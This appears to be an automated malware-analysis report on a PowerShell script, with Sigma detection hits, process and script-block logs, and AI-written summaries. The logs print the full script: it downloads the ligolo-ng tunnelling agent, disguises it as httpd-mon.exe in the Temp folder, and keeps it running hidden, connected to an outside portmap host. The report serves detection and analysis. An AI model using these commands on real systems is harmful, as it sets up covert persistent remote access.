threat_severity.level_description: Severity NONE because the file has no Google antivirus detections and no bad network activity

attributes.magic: ASCII text, with very long lines (590u), with no line terminators

sigma_analysis_results.rule_title: Suspicious Script Execution From Temp Folder
sigma_analysis_results.rule_description: Detects a suspicious script executions from temporary folder
sigma_analysis_results.rule_author: Florian Roth (Nextron Systems), Max Altgelt (Nextron Systems), Tim Shelton

match_context.values: @{CommandLine=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -Command & { while(True) { if (!(Get-Process httpd-mon -ErrorAction SilentlyContinue)) { Start-Process C:\Users\<USER>\AppData\Local\Temp\httpd-mon.exe -ArgumentList -connect slang-32792.portmap.host:32792 -ignore-cert -WindowStyle Hidden -Wait }; Start-Sleep -s 1 } }; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; EventID=1}

@{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Users\Bruno\Desktop\; OriginalFileName=PowerShell.EXE; Hashes=MD5=04029E121A0CFA5991749937DD22A1D9,SHA256=9F914D42706FE215501044ACD85A32D58AAEF1419D404FDDFA5D3B48F66CCD9F,IMPHASH=7C955A0ABC747F57CCC4324480737EF7; Description=Windows PowerShell; EventID=1; ParentCommandLine="C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -ExecutionPolicy bypass -File "C:\Users\Bruno\Desktop\code.ps1"; CommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -WindowStyle Hidden -Command & { while(True) { if (!(Get-Process httpd-mon -ErrorAction SilentlyContinue)) { Start-Process C:\Users\Bruno\AppData\Local\Temp\httpd-mon.exe -ArgumentList '-connect slang-32792.portmap.host:32792 -ignore-cert' -WindowStyle Hidden -Wait }; Start-Sleep -s 1 } } ; FileVersion=10.0.19041.546 (WinBuild.160101.0800); ParentImage=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; IntegrityLevel=High; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_description:
Adversaries may use hidden windows to conceal malicious activity from the plain sight of users.
In some cases, windows that would typically be displayed when an application carries out an operation can be hidden

match_context.values: @{ScriptBlockText=$url="https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_windows_amd64.zip"; $path="$env:TEMP\a.zip"; $exe="$env:TEMP\httpd-mon.exe"; iwr -Uri $url -OutFile $path; Expand-Archive -Path $path -DestinationPath $env:TEMP -Force; mv "$env:TEMP\agent.exe" $exe; rm $path; Start-Process powershell -ArgumentList "-WindowStyle Hidden -Command & { while($true) { if (!(Get-Process httpd-mon -ErrorAction SilentlyContinue)) { Start-Process $exe -ArgumentList '-connect slang [TRUNCATED]; MessageTotal=1; ScriptBlockId=75781d13-a71a-4f04-95f4-c51bb2aebe0b; Path=C:\Users\Bruno\Desktop\code.ps1; EventID=4104; MessageNumber=1}

@{ScriptBlockText=$url="https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_windows_amd64.zip"; $path="$env:TEMP\a.zip"; $exe="$env:TEMP\httpd-mon.exe"; iwr -Uri $url -OutFile $path; Expand-Archive -Path $path -DestinationPath $env:TEMP -Force; mv "$env:TEMP\agent.exe" $exe; rm $path; Start-Process powershell -ArgumentList "-WindowStyle Hidden -Command & { while($true) { if (!(Get-Process httpd-mon -ErrorAction SilentlyContinue)) { Start-Process $exe -ArgumentList '-connect slang [TRUNCATED]; Path=C:\Users\Bruno\Desktop\code.ps1; ScriptBlockId=2c15e1dd-2a17-47fd-b68e-8048e067687a; MessageTotal=1; MessageNumber=1; EventID=4104}

sigma_analysis_results.rule_title: Usage Of Web Request Commands And Cmdlets - ScriptBlock

crowdsourced_ai_results.analysis:
The provided PowerShell code is designed to download and execute a potentially harmful executable file. It begins by defining a URL that points to a ZIP file hosted on GitHub, which is likely a malicious payload. The code then uses the `Invoke-WebRequest` (iwr) cmdlet to download this ZIP file to a temporary location on the system. After downloading, it extracts the contents of the ZIP file to the same temporary directory.

The code renames the extracted executable file to `httpd-mon.exe` and removes the original ZIP file to cover its tracks. It then enters an infinite loop that continuously checks if the `httpd-mon` process is running. If the process is not found, it starts the executable with specific arguments that suggest it is attempting to connect to a remote server (`slang-32792.portmap.host:32792`). The use of `-ignore-cert` indicates that it may be bypassing SSL certificate validation, which is a common tactic in malicious software to avoid detection.

The overall behavior of the code indicates that it is designed to establish a persistent connection to a remote server, likely for the purpose of remote control or data exfiltration, which is characteristic of malware.

#

The script initiates by defining a URL pointing to a ZIP archive and specifying temporary paths for the download and the extracted executable. It proceeds to download the ZIP file from the specified URL to the system's temporary directory. Following the download, the archive is extracted to the same temporary directory, and a specific executable file within the extracted contents is renamed. The original downloaded ZIP file is then removed. Finally, the script launches a hidden PowerShell process that enters an infinite loop. Within this loop, it continuously checks if the renamed executable is running. If the executable is not found, it is launched with specific command-line arguments to establish a connection to a remote host, and its window is hidden. The loop pauses for one second before repeating the check.
